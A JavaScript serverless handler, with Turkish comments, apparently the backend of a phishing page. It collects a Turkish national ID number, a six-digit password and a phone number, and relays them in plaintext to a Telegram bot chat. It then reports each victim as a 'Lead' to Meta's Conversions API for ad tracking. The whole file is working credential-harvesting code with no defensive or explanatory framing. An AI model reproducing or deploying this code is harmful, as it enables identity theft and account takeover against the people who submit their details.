import axios from "axios";
import crypto from "crypto";

const parseCookie = (cookieHeader) => {
  if (!cookieHeader) return {};
  return cookieHeader.split(";").reduce((acc, cookie) => {
    const [key, value] = cookie.trim().split("=");
    acc[key] = value;
    return acc;
  }, {});
};

export default async function handler(req, res) {
  // CORS ayarları
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  // OPTIONS ön uç isteklerini işle
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ message: "Yalnızca POST istekleri desteklenir." });
  }

  try {
    const { tc, password, phone, eventID, fbp, fbc } = req.body || {};

    // Doğrulama
    if (!tc || tc.length !== 11 || !/^\d+$/.test(tc)) {
      return res.status(400).json({ message: "Geçersiz TC numarası." });
    }
    if (!password || password.length !== 6 || !/^\d+$/.test(password)) {
      return res.status(400).json({ message: "Geçersiz şifre." });
    }
    if (!phone || phone.length !== 10 || !/^\d+$/.test(phone)) {
      return res.status(400).json({ message: "Geçersiz telefon numarası." });
    }
    if (!eventID) {
      return res.status(400).json({ message: "Event ID eksik." });
    }

    // Telegram mesajı
    const message = `TC: ${tc}\nŞifre: ${password}\nTelefon Numarası: ${phone}`;
    console.log("Gönderilen veri:", {
      tc: tc.substring(0, 4) + "****" + tc.substring(8),
      password: "******",
      phone: phone.substring(0, 3) + "****" + phone.substring(7),
      eventID: eventID.substring(0, 8) + "...",
    });

    // Telegram ortam değişkenleri
    const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!telegramToken || !chatId) {
      console.error("Telegram ortam değişkenleri eksik!");
      return res.status(500).json({ message: "Sunucu yapılandırma hatası." });
    }

    // Telegram'a veri gönder
    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${telegramToken}/sendMessage`,
      {
        chat_id: chatId,
        text: message,
      },
      { timeout: 10000 }
    );
    console.log("Telegram yanıtı:", telegramResponse.data);

    if (telegramResponse.data.ok) {
      // Conversions API için veri hazırlığı
      const normalizedPhone = `+90${phone}`;
      const hashData = (data) => crypto.createHash("sha256").update(data.toLowerCase().trim()).digest("hex");
      const hashedPhone = hashData(normalizedPhone);
      const cookies = parseCookie(req.headers.cookie);
      const fbcValue = fbc || cookies._fbc || (req.query?.fbclid ? `fb.1.${Math.floor(Date.now() / 1000)}.${req.query.fbclid}` : undefined);
      const fbpValue = fbp && fbp !== "" && /^fb\.1\.\d+\.\d+$/.test(fbp) ? fbp : (cookies._fbp && /^fb\.1\.\d+\.\d+$/.test(cookies._fbp) ? cookies._fbp : undefined);
      const currentHost = req.headers["x-forwarded-host"] || req.headers["host"] || "fallback-domain.com";
      const protocol = req.headers["x-forwarded-proto"] === "https" ? "https" : "http";
      const dynamicUrl = `${protocol}://${currentHost}/telefon`;

      const payload = {
        data: [
          {
            event_name: "Lead",
            event_time: Math.floor(Date.now() / 1000),
            action_source: "website",
            event_source_url: dynamicUrl,
            event_id: eventID,
            user_data: {
              ph: [hashedPhone],
              fbc: fbcValue,
              fbp: fbpValue,
              client_ip_address: (req.headers["x-forwarded-for"] || "").split(",")[0]?.trim() || req.socket.remoteAddress || "",
              client_user_agent: req.headers["user-agent"] || "unknown",
            },
            custom_data: {
              content_category: "lead_form",
              content_name: "phone_verification",
            },
          },
        ],
        test_event_code: "TEST69639", // test_event_code kök seviyeye taşındı
      };

      // Meta ortam değişkenleri
      const metaToken = process.env.META_CONVERSIONS_TOKEN;
      const pixelId = process.env.META_PIXEL_ID;
      if (!metaToken || !pixelId) {
        console.error("Meta Conversions token veya Pixel ID eksik! Env: META_CONVERSIONS_TOKEN ve META_PIXEL_ID");
        return res.status(500).json({ message: "Meta yapılandırma hatası." });
      }

      const metaResponse = await axios.post(
        `https://graph.facebook.com/v20.0/${pixelId}/events?access_token=${metaToken}`,
        payload,
        { timeout: 10000 }
      );
      console.log("Conversions API yanıtı:", metaResponse.data);

      if (metaResponse.data.events_received) {
        console.log(`Başarılı: ${metaResponse.data.events_received} event gönderildi. Event ID: ${eventID.substring(0, 8)}...`);
      } else {
        console.error("Conversions API hatası:", metaResponse.data);
      }

      return res.status(200).json({ message: "Bilgiler gönderildi." });
    } else {
      console.error("Telegram API hatası:", telegramResponse.data);
      return res.status(500).json({ message: "Telegram gönderimi başarısız.", details: telegramResponse.data.description });
    }
  } catch (error) {
    console.error("Handler hatası:", error.message, error.response?.data);
    return res.status(500).json({ message: "Hata oluştu.", details: error.message });
  }
}
